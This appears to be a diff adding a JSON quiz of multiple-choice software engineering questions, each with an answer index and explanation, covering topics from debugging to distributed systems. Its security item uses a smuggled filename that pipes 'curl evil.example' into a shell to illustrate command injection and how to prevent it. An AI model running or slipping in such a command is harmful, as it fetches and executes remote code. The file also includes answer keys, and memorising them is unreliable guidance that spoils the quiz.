@@ -1,0 +1,240 @@
+[
+  {
+    "topicId": "decomposition",
+    "question": {
+      "q": "A report pipeline must ingest three vendor feeds, normalise them, score accounts and render PDFs. Two weeks of design docs later, nobody can say how the stages will fit together. Which approach fits best?",
+      "options": [
+        "Write a complete spec for every stage first, then code each stage in order",
+        "Fully polish the ingestion stage before you touch any of the next stages",
+        "Build a crude end-to-end slice on real data, then deepen each stage",
+        "Split by tech layer and let each person build their own layer alone"
+      ],
+      "answer": 2,
+      "explain": "A thin slice from real input to real output surfaces integration problems early. Specs written in isolation tend to miss how stages actually fit, and layer splits hide the data flow."
+    }
+  },
+  {
+    "topicId": "abstraction",
+    "question": {
+      "q": "Reviewers keep asking which flag is which in calls like `export(report, true, false, true)`, and someone now wants a fourth boolean. What should you reach for?",
+      "options": [
+        "Replace the booleans with a named options type or enum",
+        "Add the fourth boolean at the end so existing calls still compile fine",
+        "Document the argument order in the docstring, keep the signature",
+        "Wrap `export` in a helper class that forwards every call as is"
+      ],
+      "answer": 0,
+      "explain": "Flag arguments usually hide a missing concept, and a named type makes call sites self-explaining. A docstring does not fix the call site, and a pass-through wrapper adds a layer without hiding anything."
+    }
+  },
+  {
+    "topicId": "debugging",
+    "question": {
+      "q": "A 40 MB scene file crashes the importer, and each failing run takes three minutes. Nobody can tell which part of the file matters. What should you do first?",
+      "options": [
+        "Run `git bisect` across the last releases of the importer code",
+        "Add a null check at the exact line the stack trace points to",
+        "Re-run the whole file with extra logging until the cause shows up",
+        "Halve the file repeatedly, keeping whichever half still crashes"
+      ],
+      "answer": 3,
+      "explain": "Halving the input leaves a small repro with few places for the bug to hide, and it becomes the regression test. `git bisect` searches history, not input, and a guard at the crash line hides the defect."
+    }
+  },
+  {
+    "topicId": "tradeoffs",
+    "question": {
+      "q": "The checkout page 'feels slow' and a teammate wants to replace the JSON serializer with a custom binary format. Nobody has timing data for the request. What fits best?",
+      "options": [
+        "Rewrite the serializer now, since binary payloads are much smaller",
+        "Profile the request first, then pick a fix from where time goes",
+        "Put a cache in front of the endpoint and see if it feels quicker",
+        "Split the endpoint into its own microservice to isolate its cost"
+      ],
+      "answer": 1,
+      "explain": "Estimates choose a design, but only a profile shows where time goes. Optimising unmeasured code often speeds up a part that was never the bottleneck, and a cache or split adds cost without evidence."
+    }
+  },
+  {
+    "topicId": "reading-code",
+    "question": {
+      "q": "Refunds stopped working for one client, and you suspect `refund_amount` was removed from the order payload some time ago. You need to know which commit dropped it and why. What should you reach for?",
+      "options": [
+        "Run `git blame` on each file in the whole repo that mentions orders",
+        "Read the diff of every commit since the last release, one at a time",
+        "Search history for commits touching that string, read the messages",
+        "Ask an agent to summarise how the order payload works right now"
+      ],
+      "answer": 2,
+      "explain": "`git log -S` lists exactly the commits that changed the string, with messages explaining why. Blame shows only the current last-touch line, and reading every diff is far slower."
+    }
+  },
+  {
+    "topicId": "data-representation",
+    "question": {
+      "q": "In an open-world game the character moves smoothly near spawn, but at x = 80,000 the camera shakes and physics jitter. Positions are `float32`. Which approach fits best?",
+      "options": [
+        "Periodically shift the world so the player stays near zero",
+        "Compare positions with a larger epsilon in the physics code",
+        "Add smoothing and damping to the camera follow script",
+        "Cap the world size so the player cannot travel that far"
+      ],
+      "answer": 0,
+      "explain": "Float32 spacing grows with magnitude, so precision falls far from zero, and rebasing coordinates restores it. Epsilons and smoothing mask the symptom, and capping the world removes the feature."
+    }
+  },
+  {
+    "topicId": "complexity-big-o",
+    "question": {
+      "q": "A nightly job sorts 50 million scores in memory to show the top 10 players. It takes minutes and needs 8 GB of RAM. Which approach fits best?",
+      "options": [
+        "Build a hash map from player to score before sorting",
+        "Sort in parallel across cores to cut the wall-clock time",
+        "Sort once, then scan neighbours to drop the duplicate scores",
+        "Scan the scores once while keeping a min-heap of size 10"
+      ],
+      "answer": 3,
+      "explain": "A size-k heap costs O(n log k) time and O(k) memory and even works on streams. Parallel sorting still holds everything in memory, and neighbour scanning solves dedupe, not selection."
+    }
+  },
+  {
+    "topicId": "core-data-structures",
+    "question": {
+      "q": "A network tool receives cable links one at a time. After each new link, a dashboard must instantly say whether two given servers are in the same cluster. Links are never removed. What should you reach for?",
+      "options": [
+        "A breadth-first search from one server on every query",
+        "A disjoint set with path compression and union by rank",
+        "An adjacency matrix over all the servers in the network",
+        "A sorted array of server IDs searched with binary search"
+      ],
+      "answer": 1,
+      "explain": "Union and find are effectively O(1) amortized when groups only merge. BFS per query costs O(V + E) each time, and a matrix uses quadratic memory without answering connectivity quickly."
+    }
+  },
+  {
+    "topicId": "core-algorithms",
+    "question": {
+      "q": "Find the smallest daily weight capacity that ships all packages, in order, within 5 days. Capacities go up to 10^9, and checking one capacity is a simple linear pass. Which approach fits best?",
+      "options": [
+        "Greedily load the heaviest packages onto the earliest days first",
+        "Fill a DP table over every possible split of all the packages",
+        "Binary search the capacity, with the linear pass as the test",
+        "Try every capacity from 1 upward and stop at the first that works"
+      ],
+      "answer": 2,
+      "explain": "Feasibility is monotonic in capacity, so binary search needs about 30 checks. Loading heaviest first breaks the shipping order, and a DP table or linear try-all is far too slow for this range."
+    }
+  },
+  {
+    "topicId": "memory-and-execution",
+    "question": {
+      "q": "After opening and closing the Settings screen 20 times, a heap snapshot shows 20 live `SettingsScreen` instances, each referenced from the handler list of a static `ThemeChanged` event. What should you reach for?",
+      "options": [
+        "Unsubscribe the handler in the screen's teardown",
+        "Cap the event's handler list at a fixed number of entries",
+        "Deep copy the screen's data before the handler runs",
+        "Pool `SettingsScreen` objects so they are reused each time"
+      ],
+      "answer": 0,
+      "explain": "The publisher's handler list keeps every subscriber reachable, so each subscribe needs a matching unsubscribe. Capping the list drops live handlers, and pooling hides the leak instead of ending it."
+    }
+  },
+  {
+    "topicId": "concurrency-parallelism",
+    "question": {
+      "q": "Under load, throughput on `updateCart` collapses. A profile shows most threads waiting on one mutex that is held while the code makes an HTTP call to a price service. What should you reach for?",
+      "options": [
+        "Acquire the locks in one global order across every caller",
+        "Replace the mutex with an atomic counter on the cart total value",
+        "Wrap the lock acquisition in a retry loop with a short timeout",
+        "Do the HTTP call outside the lock, then lock only to apply it"
+      ],
+      "answer": 3,
+      "explain": "Slow I/O inside a critical section serialises every waiting thread, so move it out and lock only to apply the result. Lock ordering prevents deadlock, which is not the symptom here."
+    }
+  },
+  {
+    "topicId": "os-essentials",
+    "question": {
+      "q": "An ingest service reads from sockets faster than its database writer can store rows. The in-process queue between them grows by about 200 MB per hour until the process is OOM-killed. What should you reach for?",
+      "options": [
+        "Give the process a larger heap so it lasts longer between restarts",
+        "Bound the queue so that a full queue blocks or rejects the reader",
+        "Run more reader threads so more data reaches the queue sooner",
+        "Flush the queue to disk on every insert so memory stays flat"
+      ],
+      "answer": 1,
+      "explain": "A bounded queue turns overload into visible backpressure instead of an eventual crash. A bigger heap only delays the failure, and more readers make the producer even faster."
+    }
+  },
+  {
+    "topicId": "networking",
+    "question": {
+      "q": "Traces for service A calling service B show 90 ms of every 120 ms call spent on DNS, TCP and TLS handshakes, while B's handler takes only 20 ms. A opens a fresh connection per request. What fits best?",
+      "options": [
+        "Lower the DNS TTL on B's record so lookups refresh faster",
+        "Disable Nagle's algorithm on the outgoing client sockets",
+        "Reuse warm connections through a pool with keep-alive on",
+        "Move the calls from TCP to UDP so handshakes are skipped"
+      ],
+      "answer": 2,
+      "explain": "Reusing connections skips the repeated DNS, TCP and TLS round trips, which dominate here. TTL and Nagle changes do not remove handshakes, and UDP would drop reliability for no reason."
+    }
+  },
+  {
+    "topicId": "http-apis",
+    "question": {
+      "q": "`GET /reports/annual` builds a PDF in about four minutes. The load balancer cuts requests at 60 seconds, so users see 504 errors even though the job finishes. Which approach fits best?",
+      "options": [
+        "Return `202 Accepted` and a status URL, run the job in background",
+        "Raise the gateway timeout to ten minutes for this one report route",
+        "Retry the request with exponential backoff and with added jitter",
+        "Add an `ETag` so repeat requests get a `304 Not Modified` reply"
+      ],
+      "answer": 0,
+      "explain": "Accepting the job and exposing a status resource turns a fragile long request into a tracked one. A longer timeout keeps the connection fragile, and retries would start duplicate four-minute jobs."
+    }
+  },
+  {
+    "topicId": "databases",
+    "question": {
+      "q": "Two support agents open the same ticket and edit it for several minutes each. The second save silently wipes the first agent's changes. Which approach fits best?",
+      "options": [
+        "Lock the ticket row in the database for the whole edit session",
+        "Add a unique constraint on the ticket's ID column in the table",
+        "Switch the save to `SET field = field + 1` style relative updates",
+        "Add a version column, save with `WHERE id = ? AND version = ?`"
+      ],
+      "answer": 3,
+      "explain": "Optimistic locking detects the conflict at save time, and zero affected rows tells you to reload. A row lock held for minutes would block everyone, and a unique constraint cannot catch lost updates."
+    }
+  },
+  {
+    "topicId": "distributed-systems",
+    "question": {
+      "q": "An order service commits the order row, then publishes `OrderPlaced` to the broker. After a pod crash between the two steps, the warehouse never hears about some committed orders. What should you reach for?",
+      "options": [
+        "Retry the broker publish in a loop inside the same web request",
+        "Write the event to an outbox table in the same transaction",
+        "Publish the event first and write the order row only afterwards",
+        "Add a circuit breaker around all of the broker client calls"
+      ],
+      "answer": 1,
+      "explain": "Putting the event in the same transaction as the state change means a crash cannot separate them. Retries in memory die with the pod, and publishing first just swaps which half can be lost."
+    }
+  },
+  {
+    "topicId": "security-fundamentals",
+    "question": {
+      "q": "A thumbnail endpoint runs `convert ` + filename + ` out.png` through a shell. A user uploads a file named `a.png; curl evil.example | sh`. Which approach fits best?",
+      "options": [
+        "Strip semicolons and pipes from the filename before running it",
+        "Use parameterised queries when saving the filename to the database",
+        "Pass the program and arguments as a list, with the shell off",
+        "Escape the filename for HTML before it is shown in the page"
+      ],
+      "answer": 2,
+      "explain": "With an argument list and no shell, metacharacters stay literal. Stripping a blacklist of characters is easy to bypass (`$()`, newlines), and SQL or HTML escaping protects different sinks."
+    }
+  }
+]
